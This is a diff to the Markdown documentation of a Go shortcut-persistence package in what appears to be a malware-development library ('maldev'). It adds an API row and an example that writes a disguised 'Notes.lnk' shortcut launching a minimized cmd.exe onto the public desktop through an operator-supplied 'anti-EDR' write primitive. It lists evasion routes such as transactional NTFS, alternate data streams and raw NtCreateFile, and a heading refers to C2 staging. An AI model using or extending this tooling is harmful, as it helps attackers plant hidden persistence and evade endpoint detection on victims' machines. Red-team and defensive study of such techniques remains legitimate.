@@ -114,6 +114,7 @@ made at any point.**
 | `(*Shortcut).Save(path string) error` | Persist to `path` (disk, via `WScript.Shell`) |
 | `(*Shortcut).BuildBytes() ([]byte, error)` | Serialise to raw bytes — **zero-disk** (IShellLinkW + IPersistStream + HGLOBAL IStream) |
 | `(*Shortcut).WriteTo(w io.Writer) (int64, error)` | Same zero-disk path, streamed to any `io.Writer` |
+| `(*Shortcut).WriteVia(creator stealthopen.Creator, path string) error` | Build bytes in memory, then land them on disk via the operator-supplied [`stealthopen.Creator`](../evasion/stealthopen.md). nil falls back to `os.Create` |
 
 ### `type WindowStyle int`
 
@@ -176,6 +177,35 @@ _ = lnk.New().
     SetDescription("Computer Management").
     SetWindowStyle(lnk.StyleNormal).
     Save(filepath.Join(qLaunch, "Computer Management.lnk"))
+```
+
+### Stealth landing — bytes through an operator-controlled Creator
+
+`WriteVia` keeps the in-memory build (`BuildBytes`) and then routes
+the final write through any
+[`stealthopen.Creator`](../evasion/stealthopen.md) — transactional
+NTFS, encrypted-stream wrapper, alternate data stream, raw
+`NtCreateFile`, etc. Same composition story as `stealthopen.Opener`
+for read paths.
+
+```go
+import (
+    "github.com/oioio-space/maldev/evasion/stealthopen"
+    "github.com/oioio-space/maldev/persistence/lnk"
+)
+
+// Operator's anti-EDR write primitive (their package, their Open/Close).
+var creator stealthopen.Creator = myEDRBypassCreator{}
+
+_ = lnk.New().
+    SetTargetPath(`C:\Windows\System32\cmd.exe`).
+    SetWindowStyle(lnk.StyleMinimized).
+    WriteVia(creator, `C:\Users\Public\Desktop\Notes.lnk`)
+
+// nil creator falls back to os.Create — drop-in replacement for Save:
+_ = lnk.New().
+    SetTargetPath(`C:\Windows\System32\cmd.exe`).
+    WriteVia(nil, `C:\Users\Public\Desktop\Notes.lnk`)
 ```
 
 ### Zero-disk — bytes for C2 staging
